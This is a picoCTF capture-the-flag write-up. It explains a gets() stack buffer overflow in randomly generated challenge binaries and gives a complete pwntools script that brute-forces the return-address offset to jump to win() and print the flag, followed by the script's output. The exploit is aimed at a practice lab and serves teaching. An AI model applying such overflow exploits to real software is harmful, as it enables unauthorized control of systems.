
**Category:** Binary Exploitation
**Author:** Aditya Sudhansu

## 🎯 Challenge Overview

The prompt warns us: _"It's a race against time. Solve the binary exploit ASAP."_ We are given SSH access to a server containing a custom environment. Every time we request a challenge binary, the server compiles a brand-new executable with a randomized buffer size and gives us exactly 120 seconds to exploit it before it deletes the files.

**Key Tools Used:** Python 3, `pwntools`, `regex`

## 🕵️‍♂️ Initial Reconnaissance

Upon SSHing into the server, we find several files, most notably a restricted `CodeBank` directory and a Set-UID (SUID) executable named `start`.

-rw-r--r-- 1 ctf-player ctf-player  302 Feb  4 21:22 instructions.txt
-rwsr-xr-x 1 root       root      16792 Mar  9 21:27 start

Reading the `instructions.txt` reveals the mechanics of the challenge:

1. Running `./start` grabs a C source file and compiles a binary from the CodeBank.
    
2. We have exactly 120 seconds to exploit this newly generated binary to get the flag.
    
3. If we fail, the files are wiped, and we must restart the process.
    

To understand the target, I executed `./start` manually to generate a sample `.c` file and inspected its contents.

## 🐛 Vulnerability Analysis

The generated C code looks something like this (the `BUFSIZE` changes every time):
```C
#include <stdio.h>
#include <stdlib.h>
// ... [Includes truncated] ...

#define BUFSIZE 84
#define FLAGSIZE 64

void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt","r");
    // ... [File check truncated] ...
    fgets(buf,FLAGSIZE,f);
    printf(buf);
}

void vuln(){
    char buf[BUFSIZE];
    gets(buf); // <--- THE VULNERABILITY
    printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
// ... [Main function truncated] ...

```

## The Flaw: `gets()`

The `vuln()` function uses `gets(buf)` to read standard input. `gets()` is notoriously unsafe because it performs absolutely no bounds checking. It will keep writing data to the stack until it sees a newline character.

Because the buffer is located on the stack, we can write past the allocated `BUFSIZE`, overwrite the saved base pointer, and ultimately overwrite the **Instruction Pointer (Return Address)**. Our goal is a classic **Ret2Win**: overwrite the return address with the memory address of the `win()` function.

## ⚙️ The Exploitation Strategy

Because the binary name, buffer size, and memory addresses change every time we run `./start`, and we only have 120 seconds, manual exploitation is impossible. We must build a fully automated exploit script using `pwntools` that can perform the following lifecycle in under a second:

1. **Trigger Generation:** Execute `./start` programmatically.
    
2. **Reconnaissance:** Parse the output to find the new binary's name.
    
3. **Static Analysis:** Read the generated `.c` file and use Regex to extract the `BUFSIZE`.
    
4. **Binary Analysis:** Load the ELF file via `pwntools` to dynamically find the `win()` function address.
    
5. **Brute-force Payload:** Because compiler padding and stack alignment vary, we will rapid-fire payloads in a loop, incrementally increasing the offset (starting from `BUFSIZE`) until we hit the exact instruction pointer.
    

## 🚀 The Exploit Script (`exploit.py`)

Here is the final Python script written directly on the remote server:

```Python
from pwn import *
import re
import os

print("[*] Initializing automated strike...")
print("[*] Triggering ./start to spawn a fresh vulnerable binary...")

# 1. Spawn the challenge and catch the output
p_start = process('./start')
start_output = p_start.recvall().decode()

# 2. Extract the randomly generated binary name
match = re.search(r'Compilation successful:\s+(\w+)', start_output)
if not match:
    print("[-] Failed to find the generated binary name.")
    exit(1)

bin_name = match.group(1)
c_file = bin_name + '.c'
print(f"[+] Target locked: {bin_name}")

# 3. Read the C file to dynamically extract BUFSIZE
with open(c_file, 'r') as f:
    c_code = f.read()

bufsize_match = re.search(r'#define BUFSIZE\s+(\d+)', c_code)
if not bufsize_match:
    print("[-] Could not parse BUFSIZE from C file.")
    exit(1)

bufsize = int(bufsize_match.group(1))
print(f"[+] Base buffer size extracted: {bufsize} bytes")

# 4. Extract the win() function address dynamically
elf = ELF(f'./{bin_name}', checksec=False)
win_addr = elf.symbols['win']
print(f"[+] win() function located at: {hex(win_addr)}")
print(f"[+] Architecture detected: {elf.bits}-bit")

# 5. Rapid-fire Brute Force the Padding
print("[*] Commencing offset brute-force sweep...")

# The exact offset is usually BUFSIZE + (compiler padding) + (saved EBP)
for offset in range(bufsize, bufsize + 40):
    with context.local(log_level='error'): # Suppress connection logs for speed
        p = process(f'./{bin_name}')
        
        # Construct the payload
        payload = b"A" * offset
        if elf.bits == 32:
            payload += p32(win_addr)
        else:
            payload += p64(win_addr)
            
        p.recvuntil(b"Please enter your string: \n")
        p.sendline(payload)
        
        try:
            # Read output and check if we hijacked execution
            output = p.recvall(timeout=0.2)
            if b"picoCTF{" in output:
                print(f"\n[!!!] TARGET BREACHED AT OFFSET: {offset} [!!!]")
                flag = re.search(b'(picoCTF\{.*?\})', output)
                if flag:
                    print(f"\n>>> FLAG: {flag.group(1).decode()} <<<\n")
                break
        except EOFError:
            # Program crashed (wrong offset), ignore and move to next
            pass
        finally:
            p.close()
```

## 🏁 Execution & Flag

Running the script executes the entire attack chain flawlessly within seconds, easily beating the 120-second timer and completely bypassing the need to manually calculate offsets.

ctf-player@pico-chall$ python3 exploit.py
[*] Initializing automated strike...
[*] Triggering ./start to spawn a fresh vulnerable binary...
[+] Starting local process './start': pid 40
[+] Receiving all data: Done (220B)
[*] Process './start' stopped with exit code 0 (pid 40)
[+] Target locked: 16
[+] Base buffer size extracted: 84 bytes
[+] win() function located at: 0x80491f6
[+] Architecture detected: 32-bit
[*] Commencing offset brute-force sweep...

[!!!] TARGET BREACHED AT OFFSET: 96 [!!!]

>>> FLAG: picoCTF{u_Us3d_pwNt00L5_48bdb6db} <<<